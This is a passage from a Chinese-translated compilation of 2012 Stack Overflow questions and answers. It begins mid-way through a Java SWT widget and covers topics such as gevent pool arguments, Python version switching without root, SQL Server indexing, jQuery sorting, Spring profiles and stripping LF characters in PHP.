        GridLayout layout = new GridLayout(2, false);
        this.setLayout(layout);

        Label label = new Label(this,SWT.NONE);
        label.setText("Label:");
        label.setLayoutData(new GridData(SWT.BEGINNING,SWT.CENTER,false,false));
        label.addMouseListener(this);
        tableComp = new Composite(this, SWT.NONE);
        data = new GridData(SWT.FILL, SWT.FILL, false, false);

        tableComp.setLayoutData(data);

        table = new Table(tableComp, SWT.NONE);

        col = new TableColumn(table, SWT.NONE);
        col.setResizable(false);
        col.setMoveable(false);
        col.addSelectionListener( new SelectionListener() {

            @Override
            public void widgetSelected(SelectionEvent e) {
                TableHeaderButton.this.toggleSelect();
            }

            @Override
            public void widgetDefaultSelected(SelectionEvent e) {

            }
        });

        table.setHeaderVisible(true);

        TableColumnLayout tableColumnLayout = new TableColumnLayout();
        tableColumnLayout.setColumnData(col, new ColumnWeightData(100));
        tableComp.setLayout(tableColumnLayout);
        table.addMouseListener(this);
        this.setText("Text Column");

        this.addMouseListener(this);
        tableComp.addMouseListener(this);
        this.addPaintListener(new PaintListener() {

            @Override
            public void paintControl(PaintEvent e) {
                if (selected) {
                    Rectangle boounds = TableHeaderButton.this.getBounds();
                    Rectangle r = new Rectangle(0, 0, boounds.width - 1,
                            boounds.height - 1);
                    e.gc.setForeground(highlight);
                    e.gc.drawRectangle(r);
                    r = new Rectangle(1, 1, boounds.width - 3, boounds.height - 3);
                    e.gc.drawRectangle(r);
                }
                System.out.println(e.width + " " + e.height);
            }
        });

    }

    public void setText(String text) {
        col.setText(text);
        col.pack();
        table.pack();
        data.heightHint = table.getBounds().height - table.getHorizontalBar().getSize().y;
        data.widthHint = col.getWidth();
        tableComp.pack();   
        this.pack();
        this.getParent().pack();

    }

    public static void main(String[] args) {
        final Display display = new Display();
        final Shell shell = new Shell(display);
        shell.setLayout(new GridLayout(1, true));

        TableHeaderButton b = new TableHeaderButton(shell);
        b.setLayoutData(new GridData(SWT.FILL, SWT.FILL,false, false));
        b = new TableHeaderButton(shell);
        b.setLayoutData(new GridData(SWT.FILL, SWT.FILL,false, false));

        shell.pack();
        shell.open();
        while (!shell.isDisposed()) {
            if (!display.readAndDispatch()) {
                display.sleep();
            }
        }
        display.dispose();
    }

    @Override
    public void dispose() {
        super.dispose();
        this.highlight.dispose();
    };
    @Override
    public void mouseDoubleClick(MouseEvent e) {
        // Do nothing;

    }

    @Override
    public void mouseDown(MouseEvent e) {
        toggleSelect();
    }

    private void toggleSelect() {
        setText("Supercalifragilistic expialidocious");
        selected=!selected;
        redraw();
    }

    @Override
    public void mouseUp(MouseEvent e) {

    }

} 
```

# python - Python gevent：将多个参数传递给通过 pool.map 调用的函数

> ID：13490346
> 
> 赞同：2
> 
> 时间：2012-11-21T09:44:10.833
> 
> 标签：python, gevent

如何将多个参数传递给我通过 pool.map 调用的函数？

我的代码：

```
import gevent
from gevent.pool import Pool

def process(param1, param2):
    return "dosomething"

pool = Pool(10)
jobs = [('arg1a', 'arg1b'), ('arg2a', 'arg2b')]

# should pass arguments so that it results in these calls
# process(param1=arg1a, param2=arg1b)
# process(param1=arg2a, param2=arg2b)
results = pool.map(process, jobs) # does not work 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T09:57:47.917

看来该`gevent.Pool.map`方法只允许将单个项目作为参数传递给您提供的函数。但是，您可以编写函数代码以非常轻松地解压缩其参数：

```
def process(params):
    param1, param2 = params
    ... 
```

或者，您可以在调用时使用 lambda 表达式处理参数解包`pool.map`：

```
results = pool.map(lambda args: process(*args), jobs) 
```

# python - 以非 root 身份在 Python 版本之间切换

> ID：13490351
> 
> 赞同：3
> 
> 时间：2012-11-21T09:44:21.070
> 
> 标签：python

我刚刚在我们的服务器上安装了 Python 2.7，他们事先安装了 2.4。

在我构建了新版本之后，我的路径仍然指向旧版本的python，你知道一个简单的方法来改变它吗？

我没有 sudo 权限，也没有 root 访问权限。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:16:30.923

因为您在服务器上并且没有root权限，所以您最好的选择是使用[virtualenv](http://www.virtualenv.org/)

构建 Python 2.7，例如，如下：

```
$ ./configure --prefix=~/mydir
$ make
$ make install 
```

下载[`virtualen.py`](https://raw.github.com/pypa/virtualenv/master/virtualenv.py)文件并运行：

```
$ ~/mydir/bin/python virtualenv.py my_environment 
```

这将为您在`my_environment`目录中创建一个隔离的 Python 2.7 环境。

激活它运行`source my_environment/bin/activate`，就是这样。现在`python`可执行文件将是您的 Python 2.7。此外，您将`pip`安装并因此可以轻松地将任何其他库安装到您的环境中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:48:35.287

首先，您应该检查您`~/.profile`和您的 shell 配置文件（例如`~/.bashrc`bash）中是否存在包含违规路径的任何`export $PATH=`（或`PYTHONPATH`，取决于您所指的具体内容）指令。如果有，请更改它们并重新登录。那应该可以解决您的问题。

如果没有，请与您的管理员联系。如果这也没有帮助，您可以执行以下操作。在您的 shell 中，运行（可以用​​ 代替`PATH`，`PYTHONPATH`具体取决于您的实际需要）：

```
echo $PATH 
```

复制输出并根据您的需要进行修改。然后*打开另一个 shell*并运行（记住替换）：

```
export PATH="whatever you copied before" 
```

检查一切是否正常（即您仍然可以调用您需要的所有应用程序并且您的路径已相应调整）。如果是这种情况，请将命令添加到您的`~/.profile`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T09:49:30.617

这个答案假设您的环境是 Linux、Unix 或类似的东西。

如果您的问题是`PATH`环境变量未指向正确的二进制文件，请修改它`PATH`：使其包含给定目录，例如`~/bin`，通过`PATH=${HOME}/bin:${PATH}`从您的配置文件之一执行，例如`~/.profile`. 确保创建该目录，并让它包含一个名为`python`指向正确版本 Python 的符号链接。

这对于具有硬编码路径的脚本没有帮助，例如以`#!/usr/bin/python`. 当您直接从命令行调用它们时，您可以简单地调用解释器（即`python`），将脚本的名称作为参数传递：`python /path/to/script.py`。你甚至可以使用你想要的 python 版本来代替它，即`python2.7 /path/to/script.py`.

您也可以将整个序列转换为`~/bin`目录中的脚本，例如`~/bin/foo`包含以下内容：

```
#!/bin/sh
exec ${HOME}/bin/python2.7 /usr/bin/foo 
```

不要忘记`chmod -x ~/bin/foo`文件。你会得到一个可执行的 shell 脚本，它在你`PATH`的系统上安装的默认版本之前。然后，该脚本将使用非常特定的解释器调用该默认版本。所以现在你可以简单地输入短名称，并让你想要的 python 版本执行官方脚本。

其他一些脚本可能会尝试使用其绝对路径名执行给定的 python 脚本。在这种情况下，没有任何修改`PATH`会有所帮助。您必须修改相关脚本的第一行以读取例如`#!/usr/bin/env python`. 如果您无法控制这些脚本，那么您就有麻烦了，并且需要更高级的 hack 来调整系统以执行通常不会执行的操作。`LD_PRELOAD`想到了。

# sql-server - 为什么在弱实体中需要单独的索引？

> ID：13490352
> 
> 赞同：0
> 
> 时间：2012-11-21T09:44:22.863
> 
> 标签：sql-server, entity-relationship

我对 SQLServer 相当陌生，有一件事让我很困扰。希望你们中的一个可以向我解释发生了什么。

当我在索引过程中运行活动监视器时，我意识到包括弱实体在内的一些查询花费的时间比预期的要长，而且 - 甚至更奇怪 - SQLServer 建议在表单的弱实体上创建索引

```
CREATE NONCLUSTERED INDEX [<INDEXNAME>]
ON [dbo].[<TABLE>] ([<ID1>])
INCLUDE ([<ID2>])
GO 
```

这样做（实际上我索引了两列，但我认为结果几乎相同）确实提高了查询速度（至少从我在活动监视器中看到的）。

```
CREATE UNIQUE NONCLUSTERED INDEX [<INDEXNAME>] ON [dbo].[<TABLE>] 
(
    [<ID1>] ASC,
    [<ID2>] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, SORT_IN_TEMPDB = OFF, IGNORE_DUP_KEY = OFF, DROP_EXISTING = OFF, ONLINE = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
GO 
```

我现在的问题是：SQLServer 是否忽略聚集索引？如果是，为什么？我能以某种方式解决这个问题吗？添加另一个实际上应该与主键索引具有完全相同内容的索引对我来说似乎很奇怪。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T00:17:03.157

可能有多种原因 - 向我们展示您的聚集索引的定义以澄清。

如果您的聚集索引在 ID2、ID1 上，并且您在查询中选择了两列，但在 where 子句中使用了 ID1，那么这个新的非聚集索引会运行得更快是有道理的。

如果您只有 1 列上的非聚集索引但要选择两列，那么它必须转到聚集索引来查找数据，因此在这种情况下，将第二列添加为 INCLUDEd 列甚至是第二个索引列可以避免SQL 服务器必须接触数据页。

另一方面，如果您的聚集索引的顺序相同，则它可以是以下任何一种：

1.  聚集索引的填充因子 - 如果填充因子较低，则数据分布在比需要更多的数据页上，并且可能比从更密集的非聚集索引中读取数据要慢
2.  聚集索引所在的文件组（最终是磁盘） - 如果不同，查询优化器可能会识别聚集索引磁盘上的高争用或慢速寻道速度
3.  您一直在将顺序数据插入到聚集索引中，并且聚集索引 b-tree 现在是不平衡的
4.  表中发生了许多插入，导致许多页面拆分，导致数据在聚集索引上没有物理顺序
5.  您的聚集索引不是唯一的 - 在这种情况下，SQL 服务器将向您的聚集索引添加一个唯一标识符，使其比等效的非聚集索引更大，因此要读取的数据更多，因此速度更慢
6.  您的聚集索引仅在 1 列上（见下文）

如果您在 1 列（例如 ID1）上有聚集索引，则索引数据是对索引的 2 次逻辑读取，但 ID2 列数据位于索引的叶子上，即 3 次读取深度。

对于等效的非聚集索引，它只需要 2 次逻辑读取，因为它不必访问数据页，这意味着非聚集索引将快 1/3。

查看聚集索引和非聚集索引是如何存储的：

[聚集索引结构](http://msdn.microsoft.com/en-us/library/ms177443%28v=sql.90%29.aspx)

[非聚集索引结构](http://msdn.microsoft.com/en-us/library/ms177484%28v=sql.105%29.aspx)

让我知道是哪一个！

# c# - 确保对象不变？

> ID：13490353
> 
> 赞同：2
> 
> 时间：2012-11-21T09:44:26.567
> 
> 标签：c#, .net, code-contracts

有没有办法使用代码契约来确保/检查方法不会更改对象的任何成员，类似于 C++`const`方法或将所有成员设置为`readonly`？

即比以下更简单的方法：

```
Contract.Ensures(this.member1 == Contract.OldValue(this.member1));
Contract.Ensures(this.member2 == Contract.OldValue(this.member2));
Contract.Ensures(this.member3 == Contract.OldValue(this.member3));
Contract.Ensures(this.member4 == Contract.OldValue(this.member4));
Contract.Ensures(this.member5 == Contract.OldValue(this.member5)); 
```

或同样使用`Contract.EnsuresOnThrow`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:40:49.377

所以本质上你想检查方法是`Pure`. [官方文档](http://download.microsoft.com/download/C/2/7/C2715F76-F56C-4D37-9231-EF8076B7EC13/userdoc.pdf)表明它尚不支持（参见第 5.4 节）：

```
5.4 Purity

All methods called within a contract must be pure: that is, they must not update
any pre-existing state. (A pure method is allowed to modify objects that have been
created after entry into the pure method.) Code Contract tools currently assume
the following things are pure:

* Methods marked [Pure] (If a type is marked [Pure], then that applies to all of
  its methods.) The pure attribute is dened in the contract library. (Section 4.3)

* Property getters.

* Operators (static methods whose names start with op , have one or two parameters
  and a non-void return type).

* Any method whose fully qualified name begins with
  System.Diagnostics.Contracts.Contract, System.String, System.IO.Path, or
  System.Type.

* Any invoked delegate, provided that the delegate type itself is attributed with
  [Pure]. The existing delegate types System.Predicate<T> and System.Comparison<T>
  are considered pure.

In the future, there will be a purity checker that will enforce these assumptions. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-09T09:20:05.057

如果你的类实现

```
ICloneable 
```

和

```
IEquatable<YourClassType> 
```

作为值相等（不是引用相等），你可以写：

```
Contract.Ensures( 
    this.Equals ( Contract.OldValue ( (YourClassType)this.Clone() )
); 
```

# html - 如何在所有浏览器兼容性中设置 CSS？

> ID：13490363
> 
> 赞同：5
> 
> 时间：2012-11-21T09:45:04.393
> 
> 标签：html, css

如何仅为 IE 7、8 和 9 设置 CSS？

```
.pager .pages { margin:4px 0px 0 0; float:right; } 
```

IE 7 和 8 中不显示上述类。因此设计没有正确显示。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T09:51:11.877

将您的 css 放在单独的 .css 文件中，并将其添加到您的末尾`<head>`

```
<!--[if gt IE7]>
    <link rel="stylesheet" type="text/css" href="ie-only.css" />
<![endif]--> 
```

有关条件加载 css 文件的更多信息：http: [//css-tricks.com/how-to-create-an-ie-only-stylesheet/](http://css-tricks.com/how-to-create-an-ie-only-stylesheet/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T09:56:42.843

您好 Naitik 尝试关注 css。

```
For IE7:

    @media screen\9 {
    .pager .pages {
     margin:4px 0px 0 0; 
     float:right; 
    }
    }

    For IE8:

    @media \0screen{
   .pager .pages {
    {
    margin:4px 0px 0 0;
    float:right;
    }
    }

    For IE9:

    @media all and (min-width:0) {
    .pager .pages {
     margin:4px 0px 0 0; 
     float:right; ;
    }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T09:53:42.863

我现在只能假设您看到的是默认`body`边距/填充。将此添加到您的 CSS 中，看看它是否有所作为：

```
html,body{
    padding:0;
    margin:0;
} 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-11-21T09:47:53.867

试试这个。

```
.ie7 .pager .pages { //your style here }
.ie8 .pager .pages { //your style here }
.ie9 .pager .pages { //your style here } 
```

也用于交叉浏览。

# java - 如果使用 ORM 技术，如何在文档中描述系统的数据存储

> ID：13490368
> 
> 赞同：-1
> 
> 时间：2012-11-21T09:45:25.307
> 
> 标签：java, database, hibernate, orm

通常使用传统的Relational数据库，我会画一个ERD和写字段判断。

使用ORM技术时，文档有什么不同？

如何在文档中描述数据模型？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:50:03.317

您可以对域模型（实体）进行逆向工程，并使用不同类型的插件生成 EAR 图或类图。

看看这里你可以看到有哪些[免费的用于 Java/Eclipse 的 uml 图](https://stackoverflow.com/questions/390438/good-free-uml-tool-for-java-eclipse)

# c# - 如何通过 SQLiteAsyncConnection 执行原始 SQLite 查询

> ID：13490374
> 
> 赞同：3
> 
> 时间：2012-11-21T09:45:31.533
> 
> 标签：c#, sqlite, windows-8

我指的是[http://timheuer.com/blog/archive/2012/08/07/updated-how-to-using-sqlite-from-windows-store-apps.aspx](http://timheuer.com/blog/archive/2012/08/07/updated-how-to-using-sqlite-from-windows-store-apps.aspx)和[http://wp.qmatteoq。 com/using-sqlite-in-your-windows-8-metro-style-applications/](http://wp.qmatteoq.com/using-sqlite-in-your-windows-8-metro-style-applications/)

据我所知，`sqlite-net`对外键没有很好的支持。因此，我没有创建一个类来映射到一个表，而是使用以下方法来创建表。

```
 public static readonly String PROFILE_TABLE_CREATE = "create table if not exists " 
            + PROFILE_TABLE_NAME + "(" 
            + COLUMN_PROFILE_ID + " integer primary key autoincrement, "
            + COLUMN_TIMESTAMP + " integer not null, "
            + COLUMN_PROFILE_NAME + " text not null, "
            + COLUMN_AGE + " integer not null, "
            + COLUMN_GENDER + " integer not null"
            + ");";

    private async void CreateDatabase()
    {
        SQLiteAsyncConnection conn = new SQLiteAsyncConnection(DATABASE_NAME);
        await conn.ExecuteAsync(PROFILE_TABLE_CREATE);
    } 
```

* * *

现在，我想执行查询。例如，特定表中有多少行？

我可以`QueryAsync`像从 sqlite table windows 8 app 中[读取列名](https://stackoverflow.com/questions/13316412/read-column-names-from-sqlite-table-windows-8-app)那样执行。但是，我没有要映射到表的类。

在 Java 中，我可以执行原始查询，如下所示：

```
 String sql =  "select count(*) from " + tableName + " where " + HistorySQLiteOpenHelper.COLUMN_FK_TIMESTAMP + " = " + profileTimestamp;
    Cursor cursor = database.rawQuery(sql, null); 
```

如何在 C# Windows Store App 中执行此操作？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-21T12:51:20.643

要获得单个值，例如计数，您可以使用`ExecuteScalarAsync`：

```
SQLiteAsyncConnection conn = new SQLiteAsyncConnection(DATABASE_NAME);
int profileCount = await conn.ExecuteScalarAsync<int>("select count(*) from " + PROFILE_TABLE); 
```

# jquery - 如何使用 jQuery 获取移动图像的 ID？

> ID：13490380
> 
> 赞同：-1
> 
> 时间：2012-11-21T09:45:48.700
> 
> 标签：jquery, image

我正在使用 jQuery。在这里，我有一个 html 页面。在 html 中，我有两个 div。第一个 div 包含图像、名称和价格。现在我们必须将图像移动到另一个空的 div。在这里，我将图像从第一个 div 移动到第二个 div。问题是找到图像的ID。我需要找到移动图像的 ID。

这是我的 HTML。

```
 <div>
    <span class="span1">
        <img src="~/Images/galaxy.jpeg" />
    </span>
    <span class="span1">1232</span>
    <span class="span2">Cell Phone</span>
    <span class="span1">3500</span>
    <a href="#" class="pull-right"><i class="icon-plus" onclick="AddToCart(this)" id="btnid"></i></a>
  </div>
  <div class="span7" style="border:1px black" id="separat"></div> 
```

还有我的 jQuery 代码：

```
$(function() {
    AddToCart(this);
});

function AddToCart(obj) {
    var val = 0;
    var $this = $(obj).closest('div');
    var img = $this.find('img');
    var image = img;
    $('#separat').append(img);
}​ 
```

在这里，我将图像添加到第二个 div。我需要获取移动或添加的图像 ID。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:58:04.360

您需要指定一个 ID 属性开始，我们不要使用 onclick 属性：

```
 <div>
      <span class="span1">
      <img src="http://blog.codepen.io/wp-content/uploads/2012/06/Button-Black-Small.png" width=20 id="galaxy" />
      </span>
      <span class="span1">1232</span>
      <span class="span2">Cell Phone</span>
      <span class="span1">3500</span>
      <a href="#" class="pull-right"><i class="icon-plus" id="btnid">+</i></a>
   </div>
  <hr>
   Cart:
   <div class="span7" style="border:1px black" id="separat"></div> 
```

并更新您的 jQuery：

```
 function AddToCart() {
     var img = $(this).closest('div').find('img').first();
     var image_id = $(img).attr('id');
     var newobj = $('<div>');
     newobj.prepend(img.clone());
     newobj.append('<span>' + image_id + '<span>');
     $('#separat').append(newobj); 
   }

   $(function(){
     $('.icon-plus').click(AddToCart);
   }); 
```

看：

[https://gist.github.com/4124585](https://gist.github.com/4124585)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:58:58.133

```
var img_id = $this.find('img').attr('id'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T09:59:27.787

试试这个...

```
var id = img[0].id;
  alert(id); 
```

# zeromq - 没有转发器的 zeroMQ 库中的消息广播

> ID：13490384
> 
> 赞同：3
> 
> 时间：2012-11-21T09:46:02.587
> 
> 标签：zeromq

有没有办法在不使用转发器概念的情况下使用 zeroMQ 库进行消息广播？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T04:29:56.367

是的，一个 PUB 套接字将广播到所有连接的 SUB 套接字。仅当您想要桥接不同的网络时（例如从 TCP 到 PGM 多播），或者当您想要为数据流添加一些智能（例如缓存最近发布的消息）时，才需要转发器（代理）。

# ruby-on-rails - 带有关联模型的菜单以及如何在菜单项问题中使用“急切加载”方法

> ID：13490387
> 
> 赞同：0
> 
> 时间：2012-11-21T09:46:07.880
> 
> 标签：ruby-on-rails, mongodb, ruby-on-rails-3, mongoid, nosql

我想为我的项目主页制作一个翻转菜单。这将显示在网站的所有页面中。主菜单项是`SHOWS`和`PROGRAMS`。当有人滚动这些按钮时，所有程序都会在弹出的 div 中列出。（程序是我的模型的名称，它是我用于节目、电影、电视节目等的通用名称。）

现在...

以下是我的联想：

## 程序.rb

```
class Program 
  include Mongoid::Document
  include Mongoid::Timestamps

  field :title
  field :content

  belongs_to :program_category

end 
```

## 程序类别.rb

```
 class ProgramCategory 
    include Mongoid::Document
    include Mongoid::Timestamps

    field :title
    field :content

    has_many :programs

  end 
```

我需要让`program.title`s 显示在我的菜单中。像这样：

```
SHOWS         PROGRAMS
  \- Lost        \- Ellen
  \- Dexter      \- Marta Stuart
  \- Alf         \- Jey Leno Show 
```

嗯......我现在这样做：

## home_controller.rb

类 HomeController < ApplicationController

```
 def index
     @menu_programs = Program.all.where(program_category_id: "50a7c373ce3a6bcc0a000006").limit(10)    #Yes, i think it's lame too...
     @menu_shows = Program.all.where(program_category_id: "50a67f36ce3a6b840d000007").limit(10) # And yes I'm using MonoDB and Mongoid
  end 
```

是的...它们是`program_category_id`非常硬编码的！

我觉得像...

这不是最佳做法！

## 问题是：

显示关联模型中的菜单项的最佳做法是什么？我听说过一些叫做“急切加载”的东西，有人可以解释一下吗？由于 n + 1 个问题，我有 36 个查询...

欢迎任何建议。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:52:41.063

它非常简单，只需使用

```
 @menu_programs = Program.where(program_category_id: "50a7c373ce3a6bcc0a000006").include(:program_cateory).limit(10)
 @menu_shows = Program.where(program_category_id: "50a67f36ce3a6b840d000007").include(:program_cateory).limit(10) 
```

请注意，我已从您的查询中删除 .all 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-05T17:11:13.697

问题的答案`What is best practice to show menu items from associated models?`是：

我认为使用[片段缓存](http://api.rubyonrails.org/classes/ActionController/Caching/Fragments.html)。它比急于加载恕我直言更重要。

# swing - 默认 laf 不加载

> ID：13490389
> 
> 赞同：1
> 
> 时间：2012-11-21T09:46:11.767
> 
> 标签：swing, solaris, java, uispec4j

我们使用 solaris 在服务器上运行构建。将 jre 1.6 更改为 jre 1.7 后，运行所有测试的实用程序开始抛出异常（对不起我的英语）：

```
 [java] Exception in thread "main" java.lang.Error: Cannot load javax.swing.plaf.metal.MetalLookAndFeel
 [java]     at javax.swing.UIManager.initializeDefaultLAF(UIManager.java:1347)
 [java]     at javax.swing.UIManager.initialize(UIManager.java:1455)
 [java]     at javax.swing.UIManager.maybeInitialize(UIManager.java:1422)
 [java]     at javax.swing.UIManager.getDefaults(UIManager.java:656)
 [java]     at javax.swing.UIManager.put(UIManager.java:985)
 [java]     at org.uispec4j.interception.ui.UISpecLF.init(UISpecLF.java:11)
 [java]     at org.uispec4j.UISpec4J.init(UISpec4J.java:32)
 [java]     at org.uispec4j.UISpecTestCase.<clinit>(UISpecTestCase.java:31)
 [java]     at java.lang.Class.forName0(Native Method)
 [java]     at java.lang.Class.forName(Class.java:186) 
```

我也尝试在 build.xml 中切换另一个 laf 来解决这个问题，但它没有帮助。

(jvmarg value="-Dswing.defaultlaf=com.jgoodies.looks.plastic.PlasticXPLookAndFeel" )

是什么原因？如何修复它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:04:57.530

UIManager.setLookAndFeel("com.sun.java.swing.plaf.motif.MotifLookAndFeel") 像这样，您需要通过将驱动程序加载到 UIMangaer.setLookandFeel 来添加金属外观

# javascript - jQuery 使用数据 id 对元素进行排序

> ID：13490391
> 
> 赞同：47
> 
> 时间：2012-11-21T09:46:15.930
> 
> 标签：javascript, jquery, html, sorting

我的 HTML 结构如下：

```
<div class="clist">
    <div data-sid=1></div>
    <div data-sid=2></div>
    <div data-sid=2></div>
    <div data-sid=1></div>
    <div data-sid=2></div>
    <div data-sid=2></div>
    <div data-sid=1></div>
</div> 
```

我想将它们排序为：

```
<div class="clist">
    <div data-sid=1></div>
    <div data-sid=1></div>
    <div data-sid=1></div>
    <div data-sid=2></div>
    <div data-sid=2></div>
    <div data-sid=2></div>
    <div data-sid=2></div>
</div> 
```

我正在使用以下功能：

```
function sortContacts() {
    var contacts = $('div.clist'), cont = contacts.children('div');

    cont.detach().sort(function(a, b) {
        var astts = $(a).data('sid');
        var bstts = $(b).data('sid')
        return (astts > bstts) ? (astts > bstts) ? 1 : 0 : -1;
    });

    contacts.append(cont);
} 
```

它没有按预期工作。

它在第一次运行时运行良好，但在添加新元素或更改`data-sid`属性后它不再起作用。

演示：http: [//jsfiddle.net/f5mC9/1/](http://jsfiddle.net/f5mC9/1/)

不工作？

* * *

## 回答 #1

> 赞同：80
> 
> 时间：2012-11-21T09:53:44.550

您可以使用`dataset`存储`data-*`元素的所有自定义属性的属性，它返回一个字符串，以防您要将字符串转换为可以使用的数字`parseInt`或`+`运算符。

```
$('.clist div').sort(function(a,b) {
     return a.dataset.sid > b.dataset.sid;
}).appendTo('.clist'); 
```

[http://jsfiddle.net/CFYnE/](http://jsfiddle.net/CFYnE/)

你自己的代码也可以工作：http: [//jsfiddle.net/f5mC9/](http://jsfiddle.net/f5mC9/)

编辑：请注意IE10！及以下不支持该`.dataset`属性，如果你想支持所有浏览器你可以使用jQuery的`.data()`方法来代替：

```
$('.clist div').sort(function(a,b) {
     return $(a).data('sid') > $(b).data('sid');
}).appendTo('.clist'); 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-09-09T12:01:12.537

```
$('.clist div').sort(function(a,b) {
     return parseInt(a.dataset.sid) - parseInt(b.dataset.sid);
}).appendTo('.clist'); 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2017-01-20T17:46:05.757

使用 jQuery 对元素进行排序的更通用的函数：

```
$.fn.sortChildren = function (sortingFunction: any) {

    return this.each(function () {
        const children = $(this).children().get();
        children.sort(sortingFunction);
        $(this).append(children);
    });

}; 
```

用法：

```
$(".clist").sortChildren((a, b) => a.dataset.sid > b.dataset.sid ? 1 : -1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-03-19T11:08:33.467

```
function orderSteps() {
    var steps = $('div.steps'),
        cont = steps.children('div.step');
    cont.detach().sort(function (a, b) {
        var astts = a;
        var bstts = b;

        // stripping the id to get the position number
        var classArrA = $(astts).attr("id").split("-")[1];
        var classArrB = $(bstts).attr("id").split("-")[1];

        // checking for the greater position and order accordingly
        if (parseInt(classArrA) > parseInt(classArrB)) {
            return (0)
        }
        else {
            return (-1)
        }
    })
    steps.append(cont);
};

orderSteps()
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div class="container-fluid steps">
            <div class="row text-center border-bottom step" id="step-1">
                <span class="col-3">Item 1</span>
            </div>
            <div class="row text-center border-bottom step" id="step-2">
                <span class="col-3">Item 2</span>
            </div>
            <div class="row text-center border-bottom step" id="step-30">
                <span class="col-3">Item 3</span>
            </div>
            <div class="row text-center border-bottom step" id="step-4">
                <span class="col-3">Item 4</span>
            </div>
        </div>
```

# java - 处理不同环境的注解驱动的依赖注入

> ID：13490393
> 
> 赞同：9
> 
> 时间：2012-11-21T09:46:20.770
> 
> 标签：java, spring, dependency-injection, annotations, guice

我认为很多专业人士不切换到注解驱动的依赖注入的主要原因是它不支持在开发/测试/生产环境之间切换。在许多情况下，出于开发目的，您不仅使用不同的服务（以及它们的连接），而且有时您需要模拟它们，或创建 Dummy 实例。

昨天我想出了一个带有 Spring 注释的解决方案：

```
 @Value("#{${env} == "production" ? realService : dummyService}")
    private SomeService service; 
```

...这应该工作，但不是很好。

我会对您的解决方案或论点非常感兴趣：为什么这不是一个真正的问题；-) 欢迎 Guice、Spring 或任何其他。

最初的问题是这个线程的一部分：[Spring @Autowired usage](https://stackoverflow.com/questions/633158/spring-autowired-usage)，但我认为值得创建一个新线程。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-21T13:38:03.590

不幸的是，我无法对 Guice 发表评论，但正如评论中提到的，您确实可以使用 Spring 配置文件——如果您使用的是 Spring 3.1 或更高版本的话。

使用配置文件的基于 Java 的配置可能类似于：

```
@Configuration
@Profile("production")
public class ProductionConfig {
    @Bean 
    public SomeService someService() { ... }
}

@Configuration
@Profile("dev")
public class DevelopmentConfig {
    @Bean 
    public SomeService someService() { ... }
} 
```

然后你的消费类又变得更简单了：

```
...
@Autowired
private SomeService someService;
... 
```

除其他方式外，可以通过系统属性激活所需的配置文件：

```
-Dspring.profiles.active="production" 
```

在不同环境中运行您的应用程序时，这可能很有用。

就我个人而言，我尽量不依赖 Spring 配置文件。相反，我尝试将环境差异封装在外部属性文件中，这些文件在运行时传递给应用程序。到目前为止，这种方法效果很好，但是 ymmv。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-21T13:25:05.437

`@Value`注释无法按照您尝试的方式工作。它只能以字符串的形式为您提供值。对于您想要实现的目标，您可以按照@ShyJ 的建议尝试 Spring Profiles。

希望这对您有所帮助。干杯。

# php - 仅删除 txt 文件中的 LF

> ID：13490395
> 
> 赞同：2
> 
> 时间：2012-11-21T09:46:26.337
> 
> 标签：php, regex, text, notepad++

我只需要删除`LF`，而不是`CRLF`。有什么想法吗？

我可以使用 PHP、notepad++、shell 脚本等

![在此处输入图像描述](../Images/fdf2b96f5f6b1b039100ab34d7eb232f.png)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-21T10:17:43.463

在记事本++

试试这个 ：`(?<!\r)\n`

确保在搜索选项中设置正则表达式选项，希望对您有所帮助

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-21T10:16:56.773

使用负面的回顾。

```
$str = preg_replace("#(?<!\r)\n#", '', $str); 
```

[**小提琴**](http://codepad.viper-7.com/Ty9XWn)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T09:49:04.910

LF 代表换行符，它是 ASCII 10 或 0x0A 或“\n”（在 PHP 中）。所以就这样做

`search_replace( "\n", '', $text)`

请注意 CRLF 实际上是两个字符 CR（回车）+ LF。如果您删除 LF，您的文本中仍然会有 CR（如果有）。

**编辑**

如果您只想删除独立的 LF，但保留 CRLF，那么上面的代码是错误的，因为它会将 CRLF 变成 CR。用来`preg_replace()`做那个

```
preg_replace("/(?<!\\r)\\n+(?!\\r)/", '', $text); 
```

如果出于任何原因您不想使用`preg_replace()`（但无论如何都要使用它），那么您可以尝试这种愚蠢的方法：

```
// save CRLFs by replacing with some text that does 
$tmp = str_replace("\r\n", 'S0m3L1k3LyUn1Qu3T3X7', $text);

// get rid of LFs
